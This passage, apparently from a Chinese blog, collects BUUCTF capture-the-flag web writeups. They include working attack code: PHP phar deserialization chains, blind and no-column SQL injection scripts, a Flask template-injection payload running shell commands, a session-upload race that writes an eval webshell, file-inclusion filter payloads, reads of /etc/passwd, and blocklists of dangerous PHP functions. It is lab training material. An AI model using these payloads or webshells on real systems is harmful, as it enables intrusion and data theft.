(!empty($file)){ die(\u0026#39;file doesn\\\u0026#39;t exists.\u0026#39;); } ?\u0026gt; class.php：\n\u0026lt;?php class C1e4r { public $test; public $str; public function __construct($name) { $this-\u0026gt;str = $name; } public function __destruct() { $this-\u0026gt;test = $this-\u0026gt;str; echo $this-\u0026gt;test; } } class Show { public $source; public $str; public function __construct($file) { $this-\u0026gt;source = $file; //$this-\u0026gt;source = phar://phar.jpg echo $this-\u0026gt;source; } public function __toString() { $content = $this-\u0026gt;str[\u0026#39;str\u0026#39;]-\u0026gt;source; return $content; } public function __set($key,$value) { $this-\u0026gt;$key = $value; } public function _show() { if(preg_match(\u0026#39;/http|https|file:|gopher|dict|\\.\\.|f1ag/i\u0026#39;,$this-\u0026gt;source)) { die(\u0026#39;hacker!\u0026#39;); } else { highlight_file($this-\u0026gt;source); } } public function __wakeup() { if(preg_match(\u0026#34;/http|https|file:|gopher|dict|\\.\\./i\u0026#34;, $this-\u0026gt;source)) { echo \u0026#34;hacker~\u0026#34;; $this-\u0026gt;source = \u0026#34;index.php\u0026#34;; } } } class Test { public $file; public $params; public function __construct() { $this-\u0026gt;params = array(); } public function __get($key) { return $this-\u0026gt;get($key); } public function get($key) { if(isset($this-\u0026gt;params[$key])) { $value = $this-\u0026gt;params[$key]; } else { $value = \u0026#34;index.php\u0026#34;; } return $this-\u0026gt;file_get($value); } public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } } ?\u0026gt; 文件上传定死了后缀，没有unserialize入口，存在file_exists，尝试phar反序列化，构造的时候注意get魔术方法的参数$key就是无法访问的变量名，即\u0026quot;source\u0026quot;：\n\u0026lt;?php class Show { public $source; public $str; } class Test { public $file; public $params; } class C1e4r { public $test; public $str; } $o = new Test(); $o-\u0026gt;params[\u0026#39;source\u0026#39;] = \u0026#34;/var/www/html/f1ag.php\u0026#34;; $ob = new Show(); $ob-\u0026gt;str[\u0026#39;str\u0026#39;] = $o; $obj = new C1e4r(); $obj-\u0026gt;str = $ob; @unlink(\u0026#34;phar.phar\u0026#34;); $phar = new Phar(\u0026#39;phar.phar\u0026#39;); $phar -\u0026gt; stopBuffering(); $phar -\u0026gt; setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;?php __HALT_COMPILER();?\u0026gt;\u0026#39;); $phar -\u0026gt; addFromString(\u0026#39;test.txt\u0026#39;,\u0026#39;test\u0026#39;); $phar -\u0026gt; setMetadata($obj); $phar -\u0026gt; stopBuffering(); ?\u0026gt; 改个后缀上传，在file.php实现file_exists触发phar反序列化：\n?file=phar:///var/www/html/upload/0208c520bdd56cda1421798ee798e6d6.jpg\rGIF89a\u0026lt;?php __HALT_COMPILER(); ?\u0026gt; PD9waHAgDQoJLy8kYSA9ICdmbGFnezg0Yjg2NzIwLWNkNDAtNGZmOS1hOTNhLTgzNzgzMjAxNjA2ZX0nOw0KID8+DQoNCg== base64解码得到f1ag.php：\n\u0026lt;?php //$a = \u0026#39;flag{84b86720-cd40-4ff9-a93a-83783201606e}\u0026#39;; ?\u0026gt; 参考文章：\nhttps://xz.aliyun.com/news/6303\nhttps://www.php.net/manual/en/language.oop5.overloading.php#object.get\n[GYCTF2020]Ezsqli 过滤了 if case in limit for union，导致常规的information_schema无法使用，先测试一下基本的布尔注入格式：\n0||(length(database())=22) 用sys.schema_table_statistics_with_buffer来绕过information_schema，但是只能获取表名无法获取列名\nimport requests\rimport string\rurl = \u0026#34;http://8aee5d6a-4903-4e9d-869b-18fe17c5fa0b.node5.buuoj.cn:81/index.php\u0026#34;\rchars = \u0026#34;,_-\u0026#34; + string.ascii_lowercase + string.ascii_uppercase + string.digits\rtables = \u0026#34;\u0026#34;\rfor i in range(1,40): for c in chars: # 0||(ascii(substr( (select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database() ),1,1))=117)\rpayload = f\u0026#34;0||(ascii(substr( (select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database() ),{i},1))={ord(c)})\u0026#34;\rdata = {\u0026#34;id\u0026#34;: payload}\rresp = requests.post(url,data)\rif \u0026#34;Nu1L\u0026#34; in resp.text:\rprint(c)\rtables += c\rbreak\rprint(tables)\r# users233333333333333,f1ag_1s_h3r3_hhhhh 由于过滤了union，只能用比较ascii值的无列名注入，需要测试一下列数，还好本题表中只有一行，并且第一列就是1，否则还需要用到limit 0,1并爆出完整的第一列的值：\nimport requests\rimport time\rurl = \u0026#34;http://71275840-d765-4954-aefa-bc558505f6a0.node5.buuoj.cn:81\u0026#34;\rchars = r\u0026#34;-0123456789abcdefgl{}\u0026#34; # 按照ascii值大小排列，用于无列名注入\rflag = \u0026#34;\u0026#34;\rfor i in range(0,42): for c in chars: payload = f\u0026#34;((select 1,\u0026#39;{flag+c}\u0026#39;) \u0026gt; (select * from f1ag_1s_h3r3_hhhhh))\u0026#34;\rdata = {\u0026#34;id\u0026#34;: payload}\rresp = requests.post(url,data)\rif \u0026#34;Nu1L\u0026#34; in resp.text:\rcc = chars[chars.index(c)-1]\rprint(cc)\rflag += cc\rbreak\rprint(flag)\r# flag{67082dc1-010b-4e09-8734-cee942fbe7ab} 参考文章：\nhttps://exp10it.io/2022/08/mysql-no-column-name-isql-injection/\nhttps://geekdaxue.co/read/yuandian-efswk@es3ll7/big7qv\n[RootersCTF2019]I_\u0026lt;3_Flask 注入点为name，有参数长度限制，没有禁用config：\n?name={{config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;cat flag.txt\u0026#39;).read()}} flag{b9856c2c-0829-44e4-925a-78ded6c2c35c}\n\u0026ndash;\n[NPUCTF2020]ezinclude Cookie中的哈希就是对应name的pass，传入相应参数再看源码：\n?name=1\u0026amp;pass=576322dd496b99d07b5b0f7fa7934a25 \u0026lt;script language=\u0026#34;javascript\u0026#34; type=\u0026#34;text/javascript\u0026#34;\u0026gt; window.location.href=\u0026#34;flflflflag.php\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;html\u0026gt; \u0026lt;!--md5($secret.$name)===$pass --\u0026gt; \u0026lt;/html\u0026gt; 直接跳转会被定向到404页面，查看源码：\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;script language=\u0026#34;javascript\u0026#34; type=\u0026#34;text/javascript\u0026#34;\u0026gt; window.location.href=\u0026#34;404.html\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;title\u0026gt;this_is_not_fl4g_and_出题人_wants_girlfriend\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;\u0026gt; \u0026lt;body\u0026gt; include($_GET[\u0026#34;file\u0026#34;])\u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 先用php伪协议看看flflflflag.php内容，base64解码：\n?file=php://filter/read/convert.base64-encode/resource=flflflflag.php \u0026lt;?php $file=$_GET[\u0026#39;file\u0026#39;]; if(preg_match(\u0026#39;/data|input|zip/is\u0026#39;,$file)){ die(\u0026#39;nonono\u0026#39;); } @include($file); echo \u0026#39;include($_GET[\u0026#34;file\u0026#34;])\u0026#39;; ?\u0026gt; 扫一下目录，找到一个dir.php，同样用伪协议获取源码：\n\u0026lt;?php var_dump(scandir(\u0026#39;/tmp\u0026#39;)); ?\u0026gt; 方法一：利用PHP_SESSION_UPLOAD_PROGRESS+条件竞争写入一句话木马\nimport threading import requests import sys url = \u0026#34;http://0669c1b7-e523-4106-b94e-af29da2fcbbc.node5.buuoj.cn:81/flflflflag.php\u0026#34; sessid = \u0026#34;phpinfo\u0026#34; def upload(): files = [ (\u0026#39;file\u0026#39;, (\u0026#39;a.txt\u0026#39;, \u0026#39;a\u0026#39;*1024*10)), ] data = {\u0026#39;PHP_SESSION_UPLOAD_PROGRESS\u0026#39;: \u0026#34;\u0026lt;?php phpinfo();file_put_contents(\u0026#39;shell.php\u0026#39;, \u0026#39;\u0026lt;?php eval($_REQUEST[1]);?\u0026gt;\u0026#39;);?\u0026gt;\u0026#34;} while True: res = requests.post( url, data = data, files = files, cookies = {\u0026#39;PHPSESSID\u0026#39;: sessid}, ) def read(): while True: response = requests.get( f\u0026#39;{url}?file=/tmp/sess_{sessid}\u0026#39;, ) if \u0026#39;flag{\u0026#39; in response.text: print(response.text) sys.exit(0) for i in range(2): t1 = threading.Thread(target=upload) t2 = threading.Thread(target=read) t1.start() t2.start() 方法二：利用strip_tags过滤器\nimport requests from io import BytesIO payload = \u0026#34;\u0026lt;?php eval($_REQUEST[1]);?\u0026gt;\u0026#34; data = {\u0026#39;file\u0026#39;: BytesIO(payload.encode())} url = \u0026#34;http://0669c1b7-e523-4106-b94e-af29da2fcbbc.node5.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd\u0026#34; r = requests.post(url=url,files=data,allow_redirects=False) 访问dir.php获取tmp下临时文件：\nstring(9) \u0026#34;phpdazEZv\u0026#34; 包含该文件即可rce flag{71136865-f2df-413e-98aa-2f66f26c324c}\n参考文章：\nhttps://exp10it.io/2022/11/buuctf-web-writeup-6/#npuctf2020ezinclude\nhttps://www.freebuf.com/vuls/202819.html\nhttps://www.cnblogs.com/EddieMurphy-blogs/p/17992004\n[NCTF2019]SQLi robots.txt中禁止访问hint.txt，hint.txt：\n$black_list = \u0026#34;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\\\u0026#39;|=| |in|\u0026lt;|\u0026gt;|-|\\.|\\(\\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i\u0026#34;; If $_POST[\u0026#39;passwd\u0026#39;] === admin\u0026#39;s password, Then you will get the flag; 利用反斜杠转义引号＋%00截断尾部引号实现可控passwd\n抓包发现如果从网页中传入%00其实是POST%2500，猜测后端是对参数进行了urldecode，直接POST传%00即可\nusername=1\\\u0026amp;passwd=||passwd/**/regexp/**/\u0026#34;^y\u0026#34;;%00 如果成功匹配到passwd会在相应包header中返回location: welcome.php，爆破出passwd：\nimport requests import string from urllib import parse url = \u0026#34;http://d5f06424-bdcf-4fd0-95b8-8cf3ec61d0ef.node5.buuoj.cn:81\u0026#34; chars = \u0026#34;_\u0026#34; + string.ascii_lowercase + string.digits n = parse.unquote(\u0026#34;%00\u0026#34;) passwd = \u0026#34;\u0026#34; for i in range(80): for c in chars: payload = f\u0026#39;||passwd/**/regexp/**/\u0026#34;^{passwd+c}\u0026#34;;{n}\u0026#39; data = {\u0026#34;username\u0026#34;: \u0026#34;1\\\\\u0026#34;, \u0026#34;passwd\u0026#34;: payload} resp = requests.post(url,data) if \u0026#34;welcome\u0026#34; in resp.text: print(c) passwd += c break print(passwd) # you_will_never_know7788990 flag{8cad5c15-4ca5-4405-9735-ca1089060f97}\n[网鼎杯 2020 半决赛]AliceWebsite index.php：\n\u0026lt;?php $action = (isset($_GET[\u0026#39;action\u0026#39;]) ? $_GET[\u0026#39;action\u0026#39;] : \u0026#39;home.php\u0026#39;); if (file_exists($action)) { include $action; } else { echo \u0026#34;File not found!\u0026#34;; } ?\u0026gt; 文件包含，尝试获取/flag：flag{36b34fb4-3c20-418e-b83c-a7cd5459efcb}\n[网鼎杯 2018]Comment 弱密码，账号zhangwei，密码zhangwei666\n存在.git源码泄露，直接用githacker获取到的write_do.php不完整，回滚一下记录：\ngit log --reflog\rcommit e5b2a2443c2b6d395d06960123142bc91123148c (refs/stash)\rMerge: bfbdf21 5556e3a\rAuthor: root \u0026lt;root@localhost.localdomain\u0026gt;\rDate: Sat Aug 11 22:51:17 2018 +0800\rWIP on master: bfbdf21 add write_do.php\rcommit 5556e3ad3f21a0cf5938e26985a04ce3aa73faaf\rAuthor: root \u0026lt;root@localhost.localdomain\u0026gt;\rDate: Sat Aug 11 22:51:17 2018 +0800\rindex on master: bfbdf21 add write_do.php\rcommit bfbdf218902476c5c6164beedd8d2fcf593ea23b (HEAD -\u0026gt; master, origin/master, origin/HEAD)\rAuthor: root \u0026lt;root@localhost.localdomain\u0026gt;\rDate: Sat Aug 11 22:47:29 2018 +0800\radd write_do.php 有stash记录，查看并恢复stash：\ngit stash list\rstash@{0}: WIP on master: bfbdf21 add write_do.php\rgit stash apply stash@{0}\rOn branch master\rYour branch is up to date with \u0026#39;origin/master\u0026#39;.\rChanges not staged for commit:\r(use \u0026#34;git add \u0026lt;file\u0026gt;...\u0026#34; to update what will be committed)\r(use \u0026#34;git restore \u0026lt;file\u0026gt;...\u0026#34; to discard changes in working directory)\rmodified: write_do.php\rno changes added to commit (use \u0026#34;git add\u0026#34; and/or \u0026#34;git commit -a\u0026#34;) 完整的write_do.php：\n\u0026lt;?php include \u0026#34;mysql.php\u0026#34;; session_start(); if($_SESSION[\u0026#39;login\u0026#39;] != \u0026#39;yes\u0026#39;){ header(\u0026#34;Location: ./login.php\u0026#34;); die(); } if(isset($_GET[\u0026#39;do\u0026#39;])){ switch ($_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;write\u0026#39;: $category = addslashes($_POST[\u0026#39;category\u0026#39;]); $title = addslashes($_POST[\u0026#39;title\u0026#39;]); $content = addslashes($_POST[\u0026#39;content\u0026#39;]); $sql = \u0026#34;insert into board set category = \u0026#39;$category\u0026#39;, title = \u0026#39;$title\u0026#39;, content = \u0026#39;$content\u0026#39;\u0026#34;; $result = mysql_query($sql); header(\u0026#34;Location: ./index.php\u0026#34;); break; case \u0026#39;comment\u0026#39;: $bo_id = addslashes($_POST[\u0026#39;bo_id\u0026#39;]); $sql = \u0026#34;select category from board where id=\u0026#39;$bo_id\u0026#39;\u0026#34;; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num\u0026gt;0){ $category = mysql_fetch_array($result)[\u0026#39;category\u0026#39;]; $content = addslashes($_POST[\u0026#39;content\u0026#39;]); $sql = \u0026#34;insert into comment set category = \u0026#39;$category\u0026#39;, content = \u0026#39;$content\u0026#39;, bo_id = \u0026#39;$bo_id\u0026#39;\u0026#34;; $result = mysql_query($sql); } header(\u0026#34;Location: ./comment.php?id=$bo_id\u0026#34;); break; default: header(\u0026#34;Location: ./index.php\u0026#34;); } } else{ header(\u0026#34;Location: ./index.php\u0026#34;); } ?\u0026gt; 没有index.php和comment.php的代码，只知道INSERT语句的具体内容，无法得知相应页面获取数据的具体语句，可以先尝试构造注入语句。由于是多行的SQL语句，#注释符只对单行生效，因此需要用到/**/，注入category=1',content=(select user()),/*，content=*/#：\ninsert into comment set category = \u0026#39;1\u0026#39;,content=(select user()),/*\u0026#39;, content = \u0026#39;*/#\u0026#39;, bo_id = \u0026#39;$bo_id\u0026#39;\u0026#34; comment.php中存在二次注入，获取用户权限为：root@localhost\n尝试利用load_file读取/etc/passwd：\nroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin libuuid:x:100:101::/var/lib/libuuid: syslog:x:101:104::/home/syslog:/bin/false mysql:x:102:105:MySQL Server,,,:/var/lib/mysql:/bin/false www:x:500:500:www:/home/www:/bin/bash 尝试读取 /home/www/.bash_history：\ncd /tmp/ unzip html.zip rm -f html.zip cp -r html /var/www/ cd /var/www/html/ rm -f .DS_Store service apache2 start 删除了/var/www/html目录下的.DS_Store文件，但是之前在/tmp目录中解压得到的该文件仍存在，用hex读取二进制文件/tmp/html/.DS_Store，本地转换为原文件后用工具解析：\npython main.py .DS_Store\rCount: 11\rbootstrap\rcomment.php\rcss\rflag_8946e1ff1ee3e40f.php\rfonts\rindex.php\rjs\rlogin.php\rmysql.php\rvendor\rwrite_do.php 读取flag文件：\n\u0026lt;?php $flag=\u0026#34;flag{da6b6412-ea59-4408-a49e-34af567e11aa}\u0026#34;; ?\u0026gt; 参考文章：\nhttps://www.freebuf.com/articles/web/410701.html\nhttps://cn-sec.com/archives/2696887.html\nhttps://exp10it.io/2022/11/buuctf-web-writeup-6/#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018comment\nhttps://zhuanlan.zhihu.com/p/603142951\nhttps://github.com/gehaxelt/Python-dsstore\n[HarekazeCTF2019]encode_and_encode query.php：\n\u0026lt;?php error_reporting(0); if (isset($_GET[\u0026#39;source\u0026#39;])) { show_source(__FILE__); exit(); } function is_valid($str) { $banword = [ // no path traversal \u0026#39;\\.\\.\u0026#39;, // no stream wrapper \u0026#39;(php|file|glob|data|tp|zip|zlib|phar):\u0026#39;, // no data exfiltration \u0026#39;flag\u0026#39; ]; $regexp = \u0026#39;/\u0026#39; . implode(\u0026#39;|\u0026#39;, $banword) . \u0026#39;/i\u0026#39;; if (preg_match($regexp, $str)) { return false; } return true; } $body = file_get_contents(\u0026#39;php://input\u0026#39;); $json = json_decode($body, true); if (is_valid($body) \u0026amp;\u0026amp; isset($json) \u0026amp;\u0026amp; isset($json[\u0026#39;page\u0026#39;])) { $page = $json[\u0026#39;page\u0026#39;]; $content = file_get_contents($page); if (!$content || !is_valid($content)) { $content = \u0026#34;\u0026lt;p\u0026gt;not found\u0026lt;/p\u0026gt;\\n\u0026#34;; } } else { $content = \u0026#39;\u0026lt;p\u0026gt;invalid request\u0026lt;/p\u0026gt;\u0026#39;; } // no data exfiltration!!! $content = preg_replace(\u0026#39;/HarekazeCTF\\{.+\\}/i\u0026#39;, \u0026#39;HarekazeCTF{\u0026amp;lt;censored\u0026amp;gt;}\u0026#39;, $content); echo json_encode([\u0026#39;content\u0026#39; =\u0026gt; $content]); json解析有对\\uxxxx解码的特性，可以利用json_decode绕过关键字过滤，实现php伪协议读取flag：\n{\u0026#34;page\u0026#34;:\u0026#34;\\u0070hp://filter/convert.base64-encode/resource=/fla\\u0067\u0026#34;} flag{6f77661e-36e2-4a89-bc91-1de70d9d651a}\n[CISCN2019 华东南赛区]Double Secret 访问/secret，要传入参数secret，多试几次就有报错信息，查看app.py：\nif(secret==None): return \u0026#39;Tell me your secret.I will encrypt it so others can\\\u0026#39;t see\u0026#39; rc=rc4_Modified.RC4(\u0026#34;HereIsTreasure\u0026#34;) #解密 deS=rc.do_crypt(secret) a=render_template_string(safe(deS)) if \u0026#39;ciscn\u0026#39; in a.lower(): return \u0026#39;flag detected!\u0026#39; return a SSTI+RC4+URLencode：\n.%14%1E%12ä84mg%C2%9CË%00%C2%81%C2%8D¸%C2%97%0B%C2%9EF%3B%C2%88m®M5%C2%96%3D%C2%9D[Ø7ê%12´%05%C2%84A¿%17ÛhÏ%C2%8Fáa%0F®%09%C2%A0®yS*¢d|%C2%98/%00%C2%90é%03Y²Û%1F¶H%3D%0A%23ñ[%C2%9Cp®n%C2%96i]v%7FX%C2%92 \u0026lsquo;class\u0026rsquo; is not allowed. Secret is flag{4bc7eb1c-3a08-469d-a3f9-312f26ad4c31}\n","permalink":"https://blog.w8nn9z.top/posts/ctf/buuojpage3/","summary":"","title":"BUUCTF WEB page3"},{"content":"[CISCN2019 华北赛区 Day2 Web1]Hack World fuzz发现空格，-等都被过滤，考虑布尔盲注，if判断为真返回1，查询id为1的数据：\nimport requests import string url = \u0026#34;http://b9309530-9abc-44a2-ace2-f39ae7be8858.node5.buuoj.cn:81/index.php\u0026#34; chars = r\u0026#34;-{}\u0026#34; + string.ascii_lowercase + string.digits flag = \u0026#34;\u0026#34; for i in range(1,40): for c in chars: asciiValue = ord(c) payload = f\u0026#34;if(ascii(substr((select(flag)from(flag)),{i},1))={asciiValue},1,0)\u0026#34; data = {\u0026#34;id\u0026#34;:payload} resp = requests.post(url,data) if \u0026#34;girlfriend\u0026#34; in resp.text: flag += c print(f\u0026#34;flag ==\u0026gt; {flag}\u0026#34;) break flag{c1866cef-500f-403b-aec7-6d4d0898d8f3}\n[BSidesCF 2020]Had a bad day 传参?category=meowers123会报错：\nWarning: include(meowers123.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 37\rWarning: include(): Failed opening \u0026#39;meowers123.php\u0026#39; for inclusion (include_path=\u0026#39;.:/usr/local/lib/php\u0026#39;) in /var/www/html/index.php on line 37 传参?category=meo123wers无报错，但回显如下：\nSorry, we currently only support woofers and meowers. 猜测category中必须包含字符串woofers或meowers，先用伪协议+include规范化路径的特性获取index.php：\n?category=php://filter/read=convert.base64-encode/resource=meowers123.php/../index 只看被解析的php代码部分：\n\u0026lt;?php $file = $_GET[\u0026#39;category\u0026#39;]; if(isset($file)) { if( strpos( $file, \u0026#34;woofers\u0026#34; ) !== false || strpos( $file, \u0026#34;meowers\u0026#34; ) !== false || strpos( $file, \u0026#34;index\u0026#34;)){ include ($file . \u0026#39;.php\u0026#39;); } else{ echo \u0026#34;Sorry, we currently only support woofers and meowers.\u0026#34;; } } ?\u0026gt; 没写flag在哪，猜测当前目录下存在flag.php\n?category=php://filter/read=convert.base64-encode/resource=meowers123.php/../flag flag.php：\n\u0026lt;!-- Can you read this flag? --\u0026gt;\r\u0026lt;?php\r// flag{7fb88bcc-8a31-4dc9-96fc-5bbfdbb2a705}\r?\u0026gt; [网鼎杯 2018]Fakebook 这题的环境好像有问题，注册一个账号，无法点击username进行跳转，服务器会崩溃\n不过还好能发现view.php，不带参数访问view.php，报错：\nNotice: Undefined index: no in /var/www/html/view.php on line 24\r[*] query error! (You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near \u0026#39;\u0026#39; at line 1)\rFatal error: Call to a member function fetch_assoc() on boolean in /var/www/html/db.php on line 66 尝试联合注入，过滤了union和select之间的空格，用注释符绕过即可：\n?no=-1 order by 5 --+\r[*] query error! (Unknown column \u0026#39;5\u0026#39; in \u0026#39;order clause\u0026#39;)\r?no=-1 union/**/select 1,2,3,4 --+\r2的位置有回显\r?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database() --+\rusers\r?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=\u0026#34;users\u0026#34; --+\rno,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS ?no=-1 union/**/select 1,passwd,3,4 from `users` --+\r3627909a29c31381a071ec27f7c9ca97726182aed29a7ddd2e54353322cfb30abb9e3a6df2ac2c20fe23436311d678564d0c8d305930575f60e2d3d048184d79\r?no=-1 union/**/select 1,data,3,4 from `users` --+\rO:8:\u0026#34;UserInfo\u0026#34;:3:{s:4:\u0026#34;name\u0026#34;;s:7:\u0026#34;test123\u0026#34;;s:3:\u0026#34;age\u0026#34;;i:18;s:4:\u0026#34;blog\u0026#34;;s:15:\u0026#34;www.test114.com\u0026#34;;} 没思路了，看了其他师傅的wp，有robots.txt：\nUser-agent: *\rDisallow: /user.php.bak \u0026lt;?php class UserInfo { public $name = \u0026#34;\u0026#34;; public $age = 0; public $blog = \u0026#34;\u0026#34;; public function __construct($name, $age, $blog) { $this-\u0026gt;name = $name; $this-\u0026gt;age = (int)$age; $this-\u0026gt;blog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) { return 404; } curl_close($ch); return $output; } public function getBlogContents () { return $this-\u0026gt;get($this-\u0026gt;blog); } public function isValidBlog () { $blog = $this-\u0026gt;blog; return preg_match(\u0026#34;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\u0026#34;, $blog); } } 通过目录扫描得知存在flag.php，getBlogContents方法用于获取博客网站内容，将blog设为file:///var/www/html/flag.php即可获得flag.php源码\n\u0026lt;?php class UserInfo { public $name = \u0026#34;test\u0026#34;; public $age = 18; public $blog = \u0026#34;file:///var/www/html/flag.php\u0026#34;; } print(urlencode(serialize(new UserInfo()))); ?\u0026gt; O%3A8%3A%22UserInfo%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A4%3A%22test%22%3Bs%3A3%3A%22age%22%3Bi%3A18%3Bs%3A4%3A%22blog%22%3Bs%3A29%3A%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fflag.php%22%3B%7D 结合view.php中总是有unserialize的报错：\nNotice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31 猜测是union select 1,2,3,4中某个位置应该是序列化数据，结合2对应username，data又是序列化数据，所以尝试将反序列化内容填入4的位置：\n?no=-1 union/**/select 1,2,3,\u0026#39;O%3A8%3A%22UserInfo%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A4%3A%22test%22%3Bs%3A3%3A%22age%22%3Bi%3A18%3Bs%3A4%3A%22blog%22%3Bs%3A29%3A%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fflag.php%22%3B%7D\u0026#39; --+ \u0026lt;p\u0026gt;the contents of his/her blog\u0026lt;/p\u0026gt;\r\u0026lt;hr\u0026gt;\r\u0026lt;iframe width=\u0026#39;100%\u0026#39; height=\u0026#39;10em\u0026#39; src=\u0026#39;data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3tkZmY5NmI3Zi1iYzY3LTQ3MTctOTk4Ny02Nzg4MmU0YjE0ZTN9IjsNCmV4aXQoMCk7DQo=\u0026#39;\u0026gt; 解码base64得到flag.php源码：\n\u0026lt;?php $flag = \u0026#34;flag{dff96b7f-bc67-4717-9987-67882e4b14e3}\u0026#34;; exit(0); 还有另一种方法，查看用户权限，发现是root：\n?no=-1 union/**/select 1,user,3,4 from mysql.user --+ 于是可以用load_file尝试读取文件：\n?no=-1 union/**/select 1,load_file(\u0026#34;/var/www/html/flag.php\u0026#34;),3,4 --+ [网鼎杯 2020 朱雀组]phpweb 上来就有报错：\nWarning: date(): It is not safe to rely on the system\u0026#39;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone \u0026#39;UTC\u0026#39; for now, but please set date.timezone to select your timezone. in /var/www/html/index.php on line 24\r2025-07-17 07:02:47 am 查看网页源码，发现有两个隐藏的传参func和p，猜测一个是函数名还有一个是参数，尝试先读取index.php的内容：\n?func=file_get_contents\u0026amp;p=index.php ... \u0026lt;?php $disable_fun = array(\u0026#34;exec\u0026#34;,\u0026#34;shell_exec\u0026#34;,\u0026#34;system\u0026#34;,\u0026#34;passthru\u0026#34;,\u0026#34;proc_open\u0026#34;,\u0026#34;show_source\u0026#34;,\u0026#34;phpinfo\u0026#34;,\u0026#34;popen\u0026#34;,\u0026#34;dl\u0026#34;,\u0026#34;eval\u0026#34;,\u0026#34;proc_terminate\u0026#34;,\u0026#34;touch\u0026#34;,\u0026#34;escapeshellcmd\u0026#34;,\u0026#34;escapeshellarg\u0026#34;,\u0026#34;assert\u0026#34;,\u0026#34;substr_replace\u0026#34;,\u0026#34;call_user_func_array\u0026#34;,\u0026#34;call_user_func\u0026#34;,\u0026#34;array_filter\u0026#34;, \u0026#34;array_walk\u0026#34;, \u0026#34;array_map\u0026#34;,\u0026#34;registregister_shutdown_function\u0026#34;,\u0026#34;register_tick_function\u0026#34;,\u0026#34;filter_var\u0026#34;, \u0026#34;filter_var_array\u0026#34;, \u0026#34;uasort\u0026#34;, \u0026#34;uksort\u0026#34;, \u0026#34;array_reduce\u0026#34;,\u0026#34;array_walk\u0026#34;, \u0026#34;array_walk_recursive\u0026#34;,\u0026#34;pcntl_exec\u0026#34;,\u0026#34;fopen\u0026#34;,\u0026#34;fwrite\u0026#34;,\u0026#34;file_put_contents\u0026#34;); function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == \u0026#34;string\u0026#34;) { return $result; } else {return \u0026#34;\u0026#34;;} } class Test { var $p = \u0026#34;Y-m-d h:i:s a\u0026#34;; var $func = \u0026#34;date\u0026#34;; function __destruct() { if ($this-\u0026gt;func != \u0026#34;\u0026#34;) { echo gettime($this-\u0026gt;func, $this-\u0026gt;p); } } } $func = $_REQUEST[\u0026#34;func\u0026#34;]; $p = $_REQUEST[\u0026#34;p\u0026#34;]; if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(\u0026#34;Hacker...\u0026#34;); } } ?\u0026gt; ... 反序列化绕过disable_fun对func的限制，不知道为什么无法执行eval，尝试直接执行system(\u0026ldquo;whoami\u0026rdquo;)：\n?func=unserialize\u0026amp;p=O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A6%3A%22whoami%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D\rwww-data www-data find找到flag位置/tmp/flagoefiu4r93，再用cat读即可：flag{375cd5d4-9399-46b7-ab50-ab3ae8b4ab7a}\n[BJDCTF2020]The mystery of ip hint.php提示：Do you know why i know your ip?，试了试XFF，发现flag.php中的ip是通过XFF来获取拼接的，只想到了能XSS，可以通过标签指定language为PHP来rce：\n\u0026lt;script 